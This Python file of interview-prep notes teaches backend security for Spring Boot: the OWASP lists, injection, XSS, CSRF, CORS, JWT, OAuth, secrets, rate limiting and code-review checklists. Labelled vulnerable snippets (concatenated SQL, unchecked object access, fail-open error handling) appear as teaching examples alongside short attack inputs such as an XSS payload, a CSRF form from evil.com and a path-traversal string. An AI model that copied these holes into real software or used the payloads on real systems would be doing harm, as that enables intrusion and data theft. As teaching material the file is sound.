"""Subject 17: Security for Backend Engineers (prefix sec-)."""
from senior2_common import build, report, B, I, A

NOTES = []

NOTES.append(("sec-owasp-top10", "OWASP Top 10 (2021 and 2025) Through a Spring Boot Lens", r"""
The **OWASP Top 10** is a ranked list of the most critical web application risk categories, built from vulnerability data and community surveys. Interviewers don't expect you to recite it; they expect you to recognise each category in **your own code**. The 2025 edition reshuffled the 2021 list, added two categories and folded SSRF into access control.

## The 2025 list, mapped to a Spring Boot backend

| 2025 | Category | 2021 equivalent | What it looks like in a Spring app | Primary defence |
|---|---|---|---|---|
| A01 | **Broken Access Control** (now includes SSRF) | A01 + A10 SSRF | `GET /orders/{id}` returns anyone's order; `/admin/**` reachable by normal users; server fetches attacker-supplied URLs | Deny by default, object-level checks on every request, URL allowlists |
| A02 | **Security Misconfiguration** | A05 | Actuator `/env` or `/heapdump` exposed, default credentials, verbose errors, permissive CORS, public S3 bucket | Hardened defaults, config review, infra-as-code scanning |
| A03 | **Software Supply Chain Failures** (new) | A06 Vulnerable Components, expanded | Old Log4j/Jackson/Spring versions, malicious or typosquatted packages, compromised CI | Dependency scanning, pinning, SBOM, least-privilege CI |
| A04 | **Cryptographic Failures** | A02 | Plain HTTP between services, MD5/SHA-1 password hashes, hard-coded keys | TLS everywhere, bcrypt/argon2, KMS-managed keys |
| A05 | **Injection** | A03 | String-concatenated native SQL/JPQL, `ORDER BY` from request params, command injection, XSS | Parameterised queries, allowlists, output encoding |
| A06 | **Insecure Design** | A04 | No rate limit on OTP, coupon logic that can be replayed, no threat modelling | Threat modelling, abuse cases, secure design patterns |
| A07 | **Authentication Failures** | A07 (renamed) | No brute-force protection, weak password reset, JWTs never expiring | MFA, throttling, standard libraries/IdPs |
| A08 | **Software or Data Integrity Failures** | A08 | Unsigned updates, Java deserialisation of untrusted data, trusting client-side prices | Signatures, safe serialisation (JSON with type allowlists), server-side truth |
| A09 | **Security Logging & Alerting Failures** | A09 (renamed) | No log of failed logins or admin actions, or passwords in logs | Structured security events plus alerts |
| A10 | **Mishandling of Exceptional Conditions** (new) | (new) | Stack traces to users, `catch (Exception e) {}` in auth code, failing *open* when the auth service times out | Fail closed, central exception handling, safe error messages |

## The three you will be asked to code-review

**1. Access control (A01).** Authentication tells you *who* the caller is; it does not tell you whether they may touch *this* record. Every handler that takes an ID must scope the lookup to the caller or check ownership. Covered in the API Security chapter.

**2. Injection (A05).** Spring Data derived queries and `@Query` with named parameters are safe. Danger appears with string concatenation:

```java
// VULNERABLE: status and sort come straight from the request
String sql = "SELECT * FROM orders WHERE status = '" + status + "' ORDER BY " + sort;
List<?> rows = em.createNativeQuery(sql).getResultList();

// SAFE: bind values; allowlist identifiers that can't be bound
private static final Set<String> SORTABLE = Set.of("createdAt", "amount", "status");

public Page<Order> search(String status, String sort, Pageable p) {
    String field = SORTABLE.contains(sort) ? sort : "createdAt";
    return repo.findByStatus(status, PageRequest.of(p.getPageNumber(), p.getPageSize(),
                                                     Sort.by(Sort.Direction.DESC, field)));
}
```

Column names, table names and sort directions **cannot** be bound as parameters, so they need an allowlist.

**3. Misconfiguration (A02).** A favourite in Spring interviews: Actuator. `management.endpoints.web.exposure.include=*` on a public port exposes `/actuator/env` (config values), `/actuator/heapdump` (memory including secrets and tokens) and `/actuator/loggers` (attackers can turn on DEBUG). Expose only `health` and `info` publicly, put the rest on a separate management port reachable only internally, and require auth.

## A10 in practice: fail closed

```java
// Fails OPEN: if the entitlement service is down, everyone gets premium
boolean premium;
try { premium = entitlementClient.isPremium(userId); }
catch (Exception e) { premium = true; }      // "don't block users"
```

Decide failure behaviour deliberately: for authorization, payments and fraud checks, failing closed (deny, or queue for review) is the default. For non-critical features like recommendations, degrading gracefully is fine. Log the exception with context, return a generic error body (RFC 9457 `ProblemDetail` in Spring 6), and never echo SQL errors or stack traces.

## How to use this list in interviews

When you present a design or review code, walk the categories that apply: "Access control: every endpoint scoped by tenant. Injection: no native SQL concatenation. Misconfiguration: actuator locked down. Supply chain: Dependabot plus image scanning. Logging: failed logins and admin actions emitted as security events." That habit is what "security-minded senior engineer" means in practice.
"""))

NOTES.append(("sec-api-top10", "OWASP API Security Top 10: BOLA, Mass Assignment, SSRF and Friends", r"""
REST APIs expose object IDs and properties directly, so API-specific risks differ from classic web ones. The **OWASP API Security Top 10 (2023)** is the list to know for backend roles:

1. **API1 Broken Object Level Authorization (BOLA/IDOR)**
2. **API2 Broken Authentication**
3. **API3 Broken Object Property Level Authorization** (mass assignment + excessive data exposure)
4. **API4 Unrestricted Resource Consumption**
5. **API5 Broken Function Level Authorization** (normal user calls admin functions)
6. **API6 Unrestricted Access to Sensitive Business Flows** (bots buying all tickets)
7. **API7 Server Side Request Forgery**
8. **API8 Security Misconfiguration**
9. **API9 Improper Inventory Management** (forgotten `/v1`, debug endpoints)
10. **API10 Unsafe Consumption of APIs** (trusting third-party responses blindly)

## API1: BOLA, the number one API bug

```java
// VULNERABLE: any logged-in user can read any order by changing the id
@GetMapping("/api/orders/{id}")
public OrderDto get(@PathVariable long id) {
    return mapper.toDto(orderRepo.findById(id).orElseThrow(NotFoundException::new));
}

// FIXED: the query itself is scoped to the caller
@GetMapping("/api/orders/{id}")
public OrderDto get(@PathVariable long id, @AuthenticationPrincipal Jwt jwt) {
    long customerId = Long.parseLong(jwt.getSubject());
    return orderRepo.findByIdAndCustomerId(id, customerId)
            .map(mapper::toDto)
            .orElseThrow(NotFoundException::new);   // 404 avoids confirming the id exists
}
```

Alternatives: a reusable authorization bean (`@PreAuthorize("@orderAccess.canRead(#id, authentication)")`), or tenant filtering at the repository layer (Hibernate filters, row-level security) so it can't be forgotten. **Random UUIDs do not fix BOLA**; they only make IDs harder to guess, and IDs leak through URLs, logs and shared links. The fix is a check, every time, including on update, delete, export and bulk endpoints.

## API3: mass assignment and excessive data exposure

```java
// VULNERABLE: binds the request body onto the JPA entity
@PutMapping("/api/users/me")
public User update(@RequestBody User body, Principal p) {
    body.setId(currentUserId(p));
    return userRepo.save(body);   // attacker sends {"role":"ADMIN","walletBalance":99999}
}                                 // and the response leaks passwordHash, internal flags
```

```java
// FIXED: explicit request and response DTOs
public record UpdateProfileRequest(@NotBlank @Size(max = 80) String name,
                                   @Pattern(regexp = "^\\+?[0-9]{10,15}$") String phone) {}
public record ProfileResponse(long id, String name, String phone) {}

@PutMapping("/api/users/me")
public ProfileResponse update(@Valid @RequestBody UpdateProfileRequest req, Principal p) {
    User u = userRepo.findById(currentUserId(p)).orElseThrow();
    u.setName(req.name());
    u.setPhone(req.phone());
    return new ProfileResponse(u.getId(), u.getName(), u.getPhone());
}
```

Rule of thumb: **never expose JPA entities in controllers**, in either direction. DTOs define exactly which properties a caller may write and read. Setting `spring.jackson.deserialization.fail-on-unknown-properties=true` makes unexpected fields visible during testing.

## API5: function-level authorization

Admin endpoints must be denied by default. Use URL rules for coarse boundaries (`/api/admin/** hasRole('ADMIN')`) **and** method security (`@PreAuthorize`) close to the business logic, and keep `anyRequest().authenticated()` (or `denyAll()`) as the last rule so new endpoints aren't accidentally public.

## API7: SSRF

Any feature where the **server fetches a URL the user provides** (import from URL, webhooks, PDF rendering of HTML, link previews) can be abused to reach internal services or the cloud metadata endpoint (`169.254.169.254`) and steal instance credentials.

```java
URI uri = URI.create(input);
if (!"https".equals(uri.getScheme())) throw new BadRequest("https only");
for (InetAddress a : InetAddress.getAllByName(uri.getHost())) {
    if (a.isLoopbackAddress() || a.isSiteLocalAddress() || a.isLinkLocalAddress()
            || a.isAnyLocalAddress() || a.isMulticastAddress()) {
        throw new BadRequest("destination not allowed");
    }
}
// then connect to the vetted IP (not a fresh DNS lookup), with redirects disabled,
// short timeouts and a response size cap
```

Defence in depth: prefer an **allowlist** of domains when the business allows it; disable redirects (or re-validate each hop); beware DNS rebinding (validate the resolved IP you actually connect to); route outbound fetches through an egress proxy; require **IMDSv2** on AWS so a plain GET can't read credentials; and use network policies so the fetcher can't reach internal subnets.

## API4 and API6: abuse without a "bug"

Unbounded page sizes (`?size=1000000`), huge uploads, expensive search queries, and SMS/OTP endpoints that cost money per call are **resource consumption** problems. Business-flow abuse (scalping tickets, scraping prices, creating thousands of fake accounts for referral bonuses) needs rate limits per user/device/IP, bot detection, and business rules, not just input validation.

## API9 and API10

Keep an inventory of every deployed API version and host; old `/v1` endpoints without the new checks are a classic breach path. Treat responses from partners and third-party APIs as **untrusted input**: validate, set timeouts, and never follow their redirects or execute their content blindly.
"""))

NOTES.append(("sec-injection-xss-csrf-cors", "Injection, XSS, CSRF and CORS: What Actually Protects You", r"""
These four are constantly confused in interviews. A crisp mental model for each is worth more than a list of acronyms.

## Injection: data interpreted as code

Injection happens when untrusted input is concatenated into something an interpreter parses: SQL, JPQL, shell commands, LDAP filters, log lines, templates, or an LLM prompt.

- **SQL/JPQL**: bind parameters (`:status`, `?1`); allowlist identifiers like sort columns; be careful with `LIKE` (escape `%` and `_` if users shouldn't control wildcards). `JdbcTemplate.query(sql, args...)` with placeholders is safe; `String.format` into SQL is not.
- **Command injection**: avoid `Runtime.exec("convert " + filename)`. Use `ProcessBuilder` with an argument list and validated inputs, or a library.
- **Log injection**: a username containing `\n` can forge log entries. Structured JSON logging encodes it safely.
- **Deserialisation**: never deserialise untrusted Java-serialised objects; with Jackson, avoid default typing on untrusted input.

## XSS: attacker script running in your users' browsers

XSS is an **output** problem: data is rendered into HTML/JS without encoding.

- **Stored XSS**: a support-ticket comment containing `<img src=x onerror=...>` is shown in the Angular admin panel.
- **Reflected XSS**: a search term echoed into a server-rendered page.
- **DOM XSS**: front-end code writes URL fragments into `innerHTML`.

Defences: Angular escapes `{{ }}` interpolation and sanitises `[innerHTML]` by default, so the dangerous code is `bypassSecurityTrustHtml`. On the backend, return JSON with `Content-Type: application/json`, sanitise rich text on input with an allowlist sanitizer (OWASP Java HTML Sanitizer), set a **Content-Security-Policy** header, and mark session cookies `HttpOnly` so script can't read them. XSS is also why storing tokens in `localStorage` is risky: any injected script can read them.

## CSRF: the browser sends credentials for the attacker

```text
1. Victim is logged in to bank.com (session cookie in browser)
2. Victim visits evil.com, which auto-submits:
   <form action="https://bank.com/api/transfer" method="POST"> to=attacker amount=50000 </form>
3. Browser attaches bank.com cookies automatically -> transfer succeeds
```

CSRF exists **only when authentication is attached automatically** by the browser: cookies, HTTP basic auth, client certificates. Defences:

- **Synchronizer/CSRF tokens**: Spring Security enables CSRF protection by default for cookie-based sessions. For SPAs, `CookieCsrfTokenRepository.withHttpOnlyFalse()` lets Angular read the `XSRF-TOKEN` cookie and send it back as the `X-XSRF-TOKEN` header (Angular's `HttpClient` does this for you).
- **SameSite cookies**: `SameSite=Lax` (the default in modern browsers) blocks cookies on most cross-site POSTs; `Strict` is stronger. Treat this as defence in depth, not the only control.
- Never change state with `GET`.

If your API authenticates **only** with an `Authorization: Bearer` header that JavaScript adds explicitly, a cross-site form can't attach it, so disabling CSRF for that stateless API is acceptable. The moment you move the token into a cookie, you need CSRF protection again.

## CORS: a browser relaxation, not a firewall

The **same-origin policy** stops JavaScript on `evil.com` from reading responses from `api.example.com`. **CORS** lets your server tell browsers which other origins may read responses.

```java
@Bean
CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration c = new CorsConfiguration();
    c.setAllowedOrigins(List.of("https://app.example.com"));
    c.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
    c.setAllowedHeaders(List.of("Authorization", "Content-Type", "X-XSRF-TOKEN"));
    c.setAllowCredentials(true);
    UrlBasedCorsConfigurationSource src = new UrlBasedCorsConfigurationSource();
    src.registerCorsConfiguration("/api/**", c);
    return src;
}
```

Key points:

- CORS **does not protect your server**. `curl` and server-to-server callers ignore it entirely; it only governs what browsers let scripts read. Authorization still has to be enforced on every request.
- Spring rejects `allowedOrigins("*")` combined with `allowCredentials(true)`. Reflecting the request's `Origin` header back with credentials is the classic misconfiguration that lets any site read authenticated responses.
- Preflight `OPTIONS` requests happen for non-simple requests (custom headers, JSON bodies, PUT/DELETE); if they fail, the browser blocks the real request.

## A one-line summary for each

- **Injection**: never let data become code; bind, don't concatenate.
- **XSS**: encode on output; CSP; HttpOnly cookies.
- **CSRF**: only for automatically attached credentials; tokens plus SameSite.
- **CORS**: tells browsers who may read responses; it is not access control.
"""))

NOTES.append(("sec-authn-sessions-jwt", "Authentication, Sessions vs JWT and Token Pitfalls", r"""
**Authentication (authN)** proves *who* you are. **Authorization (authZ)** decides *what* you may do. HTTP signals them differently: **401 Unauthorized** means "not authenticated (or token invalid)", **403 Forbidden** means "authenticated, but not allowed". Most real breaches are authorization failures behind perfectly good authentication.

## Server-side sessions vs self-contained tokens

| | Session cookie (opaque ID) | JWT access token |
|---|---|---|
| State | Server stores session (memory, Redis, DB) | Claims inside the signed token; server stateless |
| Revocation | Delete the session: instant | Hard: valid until `exp` unless you add a denylist |
| Scaling | Needs shared store (Spring Session + Redis) | Any instance can verify with the public key |
| Size | ~32 bytes | Often 1 KB or more per request |
| Browser risk | CSRF (cookie auto-sent); mitigated by tokens and SameSite | XSS theft if stored in JS-readable storage |
| Best for | Browser web apps, one backend | Service-to-service, mobile, many APIs trusting one issuer |

A pragmatic senior answer: **browser apps** use a session cookie (`HttpOnly; Secure; SameSite`) either directly or through a **Backend-for-Frontend (BFF)** that holds OAuth tokens server-side; **APIs and microservices** accept short-lived JWT access tokens from an identity provider. "JWT everywhere because it's stateless" is not a reason by itself.

## Anatomy of a JWT

```text
header.payload.signature        (each part base64url-encoded)
{"alg":"RS256","kid":"2026-10"} . {"iss":"https://auth.acme.in","sub":"42","aud":"orders-api",
                                   "exp":1791234567,"scope":"orders:read"} . <RSA signature>
```

The payload is **encoded, not encrypted**. Anyone holding the token can read it, so never put PII, secrets or internal flags in it.

## The pitfalls interviewers ask about

1. **`alg: none`**: some old libraries accepted unsigned tokens. Always pin the expected algorithm on the verifier side.
2. **Algorithm confusion**: a server expecting RS256 is tricked into verifying an HS256 token using the *public key* as the HMAC secret. Again: configure the allowed algorithm explicitly, don't trust the header.
3. **Weak HMAC secrets**: `HS256` with `secret123` can be brute-forced offline from one token. Use 256+ bit random keys, or asymmetric keys so services only need the public key.
4. **Missing claim validation**: check signature **and** `exp`, `nbf`, `iss`, and `aud`. Without `aud`, a token issued for another service is accepted by yours.
5. **Long expiry**: a 30-day access token that leaks is a 30-day breach. Keep access tokens short (5-15 minutes).
6. **No revocation story**: logout, password change and account suspension must work. Options: short expiry plus refresh tokens you *can* revoke; a denylist of `jti` values in Redis until expiry; a per-user `tokenVersion` checked on sensitive operations.
7. **Untrusted key sources**: never fetch verification keys from a `jku`/`x5u` URL in the token header; use a configured JWKS endpoint.
8. **Leaking tokens**: in URLs (end up in logs and Referer headers), in application logs, or in `localStorage`.

In Spring, the resource server does the right thing by default: with `spring.security.oauth2.resourceserver.jwt.issuer-uri` set, it fetches the issuer's JWKS, verifies the signature, checks `exp`/`nbf` (60 s clock skew) and `iss`; add `audiences` to enforce `aud`. Hand-rolled JWT filters copied from blog posts are where the bugs live.

## Refresh tokens done properly

```text
access token : JWT, 10 min, sent as Bearer header
refresh token: opaque random string, 7-30 days, stored HASHED in DB, HttpOnly cookie for web

POST /auth/refresh (refresh token RT1)
  -> RT1 valid and unused? issue new access token + RT2, mark RT1 used   (rotation)
  -> RT1 already used?     someone replayed it: revoke the whole token family,
                           force re-login, raise a security event       (reuse detection)
```

Rotation plus reuse detection limits the damage of a stolen refresh token. Bind refresh tokens to the client (device ID) where possible, and revoke all families on password change.

## Where should a browser keep tokens?

- `localStorage` / `sessionStorage`: readable by any script, so one XSS steals tokens. Simple, but the riskiest.
- In-memory JavaScript variable plus a refresh token in an `HttpOnly` cookie: better; tokens vanish on reload and are refreshed silently.
- **BFF pattern**: the browser holds only an `HttpOnly` session cookie; the BFF holds OAuth tokens and calls APIs. Strongest for SPAs and the direction current OAuth guidance for browser apps points to. Remember to add CSRF protection because auth is cookie-based again.
"""))

NOTES.append(("sec-oauth-oidc", "OAuth 2.0 and OIDC: Authorization Code + PKCE, Client Credentials", r"""
**OAuth 2.0** is a framework for **delegated authorization**: letting a client obtain an access token to call an API on behalf of a user (or itself) without handling the user's password. **OpenID Connect (OIDC)** is a thin identity layer on top that adds *authentication*: an **ID token** (a JWT about the user) and a `userinfo` endpoint.

## The roles

- **Resource owner**: the user.
- **Client**: your Angular app, mobile app, or backend service.
- **Authorization server**: Keycloak, Auth0, Okta, AWS Cognito, Google. Issues tokens.
- **Resource server**: your Spring Boot API. Validates access tokens and enforces scopes and permissions.

## Authorization Code flow with PKCE (users)

```text
 Browser/App                   Authorization Server                   Spring API
 1. create code_verifier (random 43-128 chars)
    code_challenge = BASE64URL(SHA256(code_verifier))
 2. redirect --> /authorize?response_type=code&client_id=web&redirect_uri=...
                 &scope=openid orders:read&state=xyz&code_challenge=...&code_challenge_method=S256
 3.                            user logs in (+MFA), consents
 4. <-- redirect_uri?code=AUTH_CODE&state=xyz        (check state matches)
 5. POST /token  code=AUTH_CODE + code_verifier -->
 6.                            verifies SHA256(verifier) == challenge
    <-- access_token (+ id_token, refresh_token)
 7. GET /api/orders   Authorization: Bearer <access_token>  ------------------>  verify signature,
                                                                                  iss, aud, exp, scope
```

**Why PKCE?** The authorization code travels through the browser/redirect, where it can be intercepted (malicious app registered for the same custom URL scheme, logs, browser history). Without PKCE, whoever steals the code can redeem it. With PKCE, redeeming also requires the `code_verifier`, which never left the legitimate client. Public clients (SPAs, mobile apps) can't keep a client secret, so PKCE is their protection; current guidance recommends PKCE for **confidential clients too**.

**What's deprecated:** RFC 9700 (OAuth 2.0 Security Best Current Practice, January 2025) says the **implicit grant** (tokens returned in the URL fragment) and the **resource owner password credentials grant** (the client collects the user's password) should not be used. The in-progress OAuth 2.1 consolidates this: authorization code + PKCE for users, client credentials for machines, refresh tokens with rotation or sender-constraining.

## Client Credentials flow (service to service)

```text
order-service --POST /token grant_type=client_credentials, client_id, client_secret (or private_key_jwt)
              <-- access_token (aud=inventory-api, scope=inventory:reserve)
order-service --Bearer token--> inventory-service (validates like any other token)
```

No user is involved; the token represents the calling service. Cache the token until shortly before expiry instead of fetching one per request. Prefer `private_key_jwt` or mTLS client authentication over shared secrets where the IdP supports it. In Spring, `spring-boot-starter-oauth2-client` with an `OAuth2AuthorizedClientManager` handles fetching and refreshing for `RestClient`/`WebClient`.

## The Spring Boot resource server side

```yaml
spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          issuer-uri: https://auth.acme.in/realms/prod
          audiences: orders-api
```

```java
@Bean
SecurityFilterChain api(HttpSecurity http) throws Exception {
    return http
        .authorizeHttpRequests(a -> a
            .requestMatchers("/actuator/health/**").permitAll()
            .requestMatchers(HttpMethod.GET, "/api/orders/**").hasAuthority("SCOPE_orders:read")
            .requestMatchers("/api/admin/**").hasRole("ADMIN")
            .anyRequest().authenticated())
        .oauth2ResourceServer(o -> o.jwt(Customizer.withDefaults()))
        .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
        .csrf(c -> c.disable())     // acceptable: bearer header, no cookies
        .build();
}
```

Scopes in the token become `SCOPE_` authorities. Roles from your IdP (for example Keycloak's `realm_access.roles`) need a custom `JwtAuthenticationConverter` to map them to `ROLE_` authorities.

## Common confusions to clear up in interviews

- **ID token vs access token**: the ID token is for the *client* to learn who logged in; never send it to APIs as a credential. The access token is for the *API*; the client should treat it as opaque.
- **Scopes vs permissions**: scopes limit what the *client* may do on the user's behalf (`orders:read`); they don't replace your own object-level checks (this user can read *their* orders).
- **OAuth is not authentication** on its own; "login with Google" is OIDC.
- **State and nonce**: `state` protects the redirect against CSRF; `nonce` binds the ID token to the login request.
- **Redirect URIs** must be exact-match registered; open redirects in your app can leak codes.
"""))

NOTES.append(("sec-passwords-secrets-tls", "Passwords, Secrets and Encryption: Hashing, Vaults, TLS and mTLS", r"""
## Password storage

Passwords are **hashed with a slow, salted, adaptive function**, never encrypted (encryption is reversible) and never hashed with fast functions like MD5 or SHA-256 (GPUs try billions per second). Current OWASP minimums:

| Algorithm | Recommended minimum |
|---|---|
| **Argon2id** (first choice) | 19 MiB memory, 2 iterations, parallelism 1 |
| **scrypt** | N=2^17, r=8, p=1 |
| **bcrypt** (fine, very common) | cost factor 10 or more; inputs limited to 72 bytes |
| PBKDF2-HMAC-SHA256 (FIPS) | 600,000 iterations |

Each hash has its own random **salt** (stored inside the hash string), so identical passwords produce different hashes and rainbow tables are useless. Tune the cost so one verification takes tens to a few hundred milliseconds on your servers.

```java
@Bean
PasswordEncoder passwordEncoder() {
    // stores "{bcrypt}$2a$10$..." by default and can verify older formats by their prefix
    return PasswordEncoderFactories.createDelegatingPasswordEncoder();
}
```

The `DelegatingPasswordEncoder` prefix makes **algorithm upgrades** painless: implement `UserDetailsPasswordService` and Spring rehashes a user's password with the current algorithm the next time they log in successfully. For Argon2: `Argon2PasswordEncoder.defaultsForSpringSecurity_v5_8()`. A **pepper** (a secret key mixed in, stored outside the DB) adds protection if only the database leaks.

Also part of "password security": rate-limit login, check new passwords against breached-password lists, support MFA, and make password reset tokens single-use, short-lived and stored hashed.

## Secrets management

Secrets are DB passwords, API keys, signing keys, OAuth client secrets and webhook signing secrets.

- **Store** them in a manager: AWS Secrets Manager, SSM Parameter Store, HashiCorp Vault, GCP Secret Manager. Spring Cloud AWS / Spring Cloud Vault can load them as properties at startup.
- **Access** them with workload identity (IAM roles, IRSA), not a master password in an env file.
- **Rotate** regularly and automatically; better still, use **short-lived dynamic credentials** (Vault database secrets engine, IAM database authentication).
- **Never** commit them to git, bake them into images, put them in Helm values, print them in logs, or paste them into AI tools.
- **Detect** leaks with pre-commit hooks (gitleaks), GitHub secret scanning and push protection.
- **If one leaks**: revoke and rotate first (minutes matter, bots scrape GitHub constantly), check access logs for misuse, then clean up history. Deleting the commit is not remediation; the secret is already compromised.

## Encryption at rest

Managed services encrypt disks and backups with **KMS** keys (RDS, S3, EBS). For especially sensitive fields (Aadhaar, PAN, bank account numbers) consider **application-level encryption** with **envelope encryption**: KMS holds a key-encryption key; you encrypt each record with a data key that is itself stored encrypted. That way a DB dump or a read replica in the wrong hands still doesn't reveal the values. For card data, use your payment gateway's **tokenisation** and never store CVV at all (PCI DSS).

## TLS and mTLS

**TLS** gives confidentiality, integrity and **server authentication**: the client checks the server's certificate chain and hostname. Practical rules:

- TLS 1.2 minimum, prefer 1.3; HSTS on public domains; automated certificate renewal (ACM, cert-manager with Let's Encrypt).
- Decide where TLS terminates. Commonly at the load balancer, then plain HTTP inside the VPC. Zero-trust setups re-encrypt to the pod or use a mesh.
- **Never disable certificate or hostname verification** in clients ("trust all certs" snippets, often suggested by AI tools to "fix" a PKIX error). Fix the trust store instead.

**mTLS** (mutual TLS) adds **client authentication**: both sides present certificates, so service B knows the caller really is service A.

```text
order-svc  --ClientHello-->           inventory-svc
           <--server cert--            (order-svc verifies inventory's identity)
           --client cert-->            (inventory verifies order-svc's identity)
           ==== encrypted channel, both identities proven ====
```

Running mTLS by hand (issuing, rotating, revoking certs for every service) is painful, so service meshes (Istio, Linkerd) or SPIFFE/SPIRE automate identity and rotation. mTLS proves *which workload* is calling; you still need authorization (which service may call which endpoint) and, for user context, a propagated user token.

## Interview soundbite

"Passwords: Argon2id or bcrypt through Spring's delegating encoder. Secrets: Secrets Manager via IAM roles, rotated, never in git or images. Data: KMS at rest, field-level encryption for identity numbers. Transport: TLS 1.2+ at the edge, mTLS or signed service tokens inside."
"""))

NOTES.append(("sec-abuse-errors-logging", "Rate Limiting, Abuse Prevention, Error Handling and Security Logging", r"""
Many incidents at product companies aren't clever exploits; they're **abuse of legitimate features**: credential stuffing, OTP floods, scraping, coupon farming. Interviewers at fintech and e-commerce companies love these scenarios.

## Rate limiting: who, what, how much

Limit along several dimensions at once:

| Dimension | Example limit | Stops |
|---|---|---|
| Per IP | 100 req/min on `/login` | Simple brute force |
| Per account / identifier | 5 failed logins per account per 15 min | Distributed brute force on one victim |
| Per phone number | 3 OTP sends per hour, 10 per day | SMS pumping, harassment |
| Per user, per endpoint | 60 searches/min | Scraping, expensive queries |
| Global | Max SMS spend per hour | Toll fraud bills |

Algorithms: **token bucket** (allows bursts, most common), sliding window counters, fixed windows (simple, bursty at edges). In a cluster the counters must be shared, typically in **Redis** with atomic operations or Lua scripts; Bucket4j has Redis integrations. Gateways (Spring Cloud Gateway, Kong, AWS WAF/API Gateway) handle coarse limits before traffic reaches your service. Return **429 Too Many Requests** with a `Retry-After` header. See `/system-design/concepts/rate-limiting` for the algorithms.

```java
// Sketch: per-phone OTP limiter using Redis INCR with expiry
public void checkOtpQuota(String phone) {
    String key = "otp:send:" + phone + ":" + LocalDate.now();
    Long count = redis.opsForValue().increment(key);
    if (count != null && count == 1) redis.expire(key, Duration.ofDays(1));
    if (count != null && count > 10) throw new TooManyRequestsException("OTP limit reached");
}
```

## Login and OTP abuse, specifically

- **Account lockout** after N failures is itself a denial-of-service lever (lock out the CEO by failing their login on purpose). Prefer **progressive delays**, CAPTCHA after a few failures, MFA, and alerts on spikes.
- **Credential stuffing** (leaked passwords from other sites) is defeated by MFA, breached-password checks and device/IP reputation, not by complexity rules.
- **OTP verification**: limit attempts per code (3-5), expire codes quickly (2-5 minutes), make them single-use, compare in constant time, and bind them to the transaction they authorise.
- **Enumeration**: login, signup and "forgot password" should respond identically whether or not the account exists ("If an account exists, we've sent an email"), with similar response times.

## Unrestricted resource consumption (API4)

Cap everything a client controls: page size (`size` max 100), request body size, upload size, number of items in batch requests, query complexity (GraphQL depth), regular-expression input length (ReDoS), and timeouts for every outbound call. Expensive operations (exports, report generation) go to a queue with per-user concurrency limits.

## Error handling: fail closed and say little

The 2025 OWASP list added **Mishandling of Exceptional Conditions**. In a Spring service that means:

- A single `@RestControllerAdvice` maps exceptions to safe responses using `ProblemDetail` (RFC 9457): a type, title, status and a correlation ID, nothing internal.
- Keep `server.error.include-stacktrace=never` and `include-message=never` (Spring Boot's defaults), and don't return SQL errors, class names or file paths.
- No empty `catch` blocks around security decisions; when an authorization or fraud dependency fails, **deny or defer** rather than allow.
- Handle partial failures explicitly: a payment debited but the order write failed must end in a known state (retry, compensate, or reconcile), not a swallowed exception.

## Security logging and alerting

Log **security events** in structured form with user ID, IP, user agent, request/trace ID and outcome:

- logins (success and failure), MFA changes, password resets
- authorization failures (403s), especially repeated ones (someone probing IDs)
- admin actions, role changes, data exports, API key creation
- input validation failures at unusual rates

**Never log**: passwords, OTPs, session IDs, access or refresh tokens, full card numbers, CVV, Aadhaar/PAN, or full request bodies of sensitive endpoints. Mask by default (`98XXXXXX21`). Use JSON logging so attacker-controlled strings can't forge log lines.

Logs only matter if someone looks: alert on spikes in 401/403/429, many accounts from one IP, many OTPs to one number range, and impossible-travel logins. Keep an audit trail for privileged actions that application admins can't edit.
"""))

NOTES.append(("sec-review-checklist-privacy", "Secure Code Review Checklist, Supply Chain and PII Basics", r"""
Senior engineers are expected to **catch security issues in review** and to design with privacy in mind. This chapter gives you a checklist you can actually run through in a code review round, plus the privacy basics Indian product companies now ask about.

## The secure code review checklist (ranked by how often it finds real bugs)

**1. Authorization**
- Does every endpoint that takes an ID check ownership/tenant (BOLA)? Including update, delete, export, bulk and "internal" endpoints?
- Are admin functions protected by role checks close to the logic? Is the default `authenticated()`/`denyAll()`?
- Are request DTOs used (no entity binding, so no mass assignment) and response DTOs (no `passwordHash` leaks)?

**2. Input handling and injection**
- Any string-built SQL/JPQL, `ORDER BY` from input, shell commands, file paths built from user input (`../../etc/passwd`)?
- Bean Validation on request DTOs (`@Valid`, sizes, patterns)? Limits on page size, upload size, batch size?
- Does the code fetch user-supplied URLs (SSRF)?

**3. Authentication and sessions**
- Token validation via the framework (issuer, audience, expiry), not a custom filter? Reasonable expiries? Logout/revocation?
- Password handling via `PasswordEncoder`? Reset tokens single-use and hashed?

**4. Secrets and crypto**
- No secrets in code, config files, tests or logs? No "trust all certificates"? No home-made crypto, no `Random` for tokens (use `SecureRandom`)?

**5. Error handling and logging**
- Generic error responses? No sensitive data in logs? Security events logged? Fail-closed behaviour on dependency errors?

**6. Business logic and abuse**
- Can it be replayed (idempotency keys for payments)? Race conditions (double spend via concurrent requests; use conditional updates or locks)? Client-supplied prices or totals trusted? Rate limits on costly operations?

**7. Dependencies and config**
- New dependency: is it maintained, the real package (not a typosquat), licensed acceptably, and free of known CVEs? Any new Actuator exposure, CORS change, or `permitAll()`?

When reporting, **order findings by production risk**: "BOLA on export endpoint (blocking), missing rate limit on OTP resend (blocking), logs include phone numbers (should fix), naming (nit)".

## Software supply chain (OWASP 2025 A03)

Log4Shell (CVE-2021-44228) showed how one transitive dependency can expose almost every Java service on the internet. Practices:

- **Know what you ship**: generate an SBOM (CycloneDX Maven plugin) per build.
- **Scan continuously**: Dependabot/Renovate for updates, OWASP Dependency-Check, Snyk or GitHub advisories in CI; container scanning for OS packages.
- **Pin and verify**: fixed versions through Spring Boot's dependency management, checksums, a private artifact proxy (Nexus/Artifactory) instead of pulling directly from the internet.
- **Be suspicious of new packages**: typosquats, and AI-suggested packages that don't exist (attackers register hallucinated names, so-called slopsquatting).
- **Protect the pipeline**: CI secrets scoped minimally, branch protection, signed images (Sigstore cosign), and admission policies that only allow signed images into the cluster.
- **Patch fast**: have a playbook to find every service using library X within an hour.

## PII and data privacy basics

**PII** is any data that identifies a person: name, phone, email, address, Aadhaar, PAN, bank account, device IDs, precise location, and combinations of quasi-identifiers. Some is **sensitive** (financial, health, biometrics, government IDs) and deserves stronger controls.

Principles to apply as a backend engineer:

1. **Minimise**: don't collect or keep what the feature doesn't need. The safest data is data you never stored.
2. **Classify and tag** columns and topics (public, internal, confidential, restricted), so access rules and masking can follow the tags.
